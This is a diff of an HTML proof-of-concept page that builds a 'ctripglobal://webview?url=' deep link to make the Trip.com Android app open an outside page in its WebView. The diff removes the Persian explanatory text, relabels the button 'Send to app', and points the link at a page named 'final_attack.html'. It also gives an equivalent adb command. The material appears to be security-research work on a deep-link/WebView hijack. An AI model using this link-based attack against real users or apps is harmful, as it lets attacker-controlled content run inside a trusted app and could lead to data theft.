@@ -102,18 +102,14 @@
   </head>
   <body>
     <div class="card">
-      <h1>باز کردن WebView تریپ (Deep link)</h1>
-      <p>
-        این صفحه همان intent زیر را از داخل مرورگر اندروید شبیه‌سازی می‌کند؛
-        <code>adb</code> از داخل HTML اجرا نمی‌شود. روی دکمه بزنید یا لینک را کپی کنید.
-      </p>
+      <h1>  WebView  (Deep link)</h1>
+  
       <div class="target" id="deeplink"></div>
       <div class="actions">
-        <a class="btn" id="openLink" href="#">باز کردن در اپ</a>
-        <button type="button" class="btn secondary" id="copyBtn">کپی لینک</button>
+        <a class="btn" id="openLink" href="#">Send to app </a>
       </div>
       <div class="note">
-        معادل ADB (روی کامپیوتر):
+         ADB 
         <br /><br />
         <code style="display: block; padding: 10px; margin-top: 8px; white-space: pre-wrap; word-break: break-all"
           >adb shell am start -a android.intent.action.VIEW -d "ctripglobal://webview?url=https://ferhadfaal.github.io/CV/trip/final_attack.html"</code
@@ -122,7 +118,7 @@
     </div>
     <script>
       (function () {
-        var targetPage = "https://ferhadfaal.github.io/CV/trip/poc2.html";
+        var targetPage = "https://ferhadfaal.github.io/CV/trip/final_attack.html";
         var deepLink =
           "ctripglobal://webview?url=" + encodeURIComponent(targetPage);
 
@@ -144,9 +140,7 @@
           ta.select();
           try {
             document.execCommand("copy");
-            alert("لینک کپی شد.");
           } catch (e) {
-            alert("کپی نشد؛ لینک را از جعبهٔ بالا دستی کپی کنید.");
           }
           document.body.removeChild(ta);
         });
